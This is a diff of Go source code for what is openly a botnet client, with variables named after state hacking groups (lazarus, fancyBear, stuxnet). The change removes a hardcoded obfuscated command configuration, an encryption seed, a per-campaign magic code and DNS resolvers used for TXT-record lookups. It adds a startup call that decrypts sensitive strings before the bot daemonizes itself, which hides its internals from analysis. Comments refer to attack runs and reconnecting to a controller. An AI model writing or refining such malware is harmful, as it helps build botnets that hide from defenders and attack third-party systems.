@@ -14,24 +14,6 @@ import (
 	"time"
 )
 
-//run setup.py dont try to change this yourself
-
-// Debug mode - set to true to see DNS resolution logs
-var debugMode = false
-
-// Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "mVEeQIl7VoV3hBLEEFnBCfnUrKRcQpXXnbDcWBM=" //change me run setup.py
-const cryptSeed = "1feb8ca2"                                //change me run setup.py
-
-// DNS servers for TXT record lookups (shuffled for load balancing)
-var lizardSquad = []string{
-	"1.1.1.1:53",        // Cloudflare
-	"8.8.8.8:53",        // Google
-	"9.9.9.9:53",        // Quad9
-	"208.67.222.222:53", // OpenDNS
-	"1.0.0.1:53",        // Cloudflare secondary
-}
-
 // ============================================================================
 // LOGGING & DEBUG FUNCTIONS
 // ============================================================================
@@ -47,19 +29,11 @@ func deoxys(format string, args ...interface{}) {
 	}
 }
 
-const (
-	magicCode       = "4wA*Qx1c3kO5qeKw" //change this per campaign
-	protocolVersion = "v3.7"             //change this per campaign
-)
-
 var (
-	fancyBear        = 5 * time.Second
-	cozyBear         = 2024
 	lazarusListener  net.Listener
 	lazarusActive    bool
 	lazarusMutex     sync.Mutex
 	lazarusCount     int32
-	lazarusMax       int32 = 100
 	aptStopChan            = make(chan struct{})
 	aptStopMutex     sync.Mutex
 	aptAttackRunning bool
@@ -76,9 +50,6 @@ var (
 	cachedProc   string
 	cachedUplink float64
 )
-
-// equationGroup defines the buffer size for various operations (256 bytes)
-const equationGroup = 256
 
 // ============================================================================
 // UTILITY FUNCTIONS
@@ -233,6 +204,9 @@ func machete(cmd string, conn net.Conn) error {
 //
 // The bot will continuously attempt to reconnect on disconnection.
 func main() {
+	// Decrypt all sensitive strings before anything else touches them.
+	initSensitiveStrings()
+
 	// Daemonize first — forks, detaches, redirects fds, ignores signals.
 	// Parent exits here; only the daemon child continues past this point.
 	stuxnet()
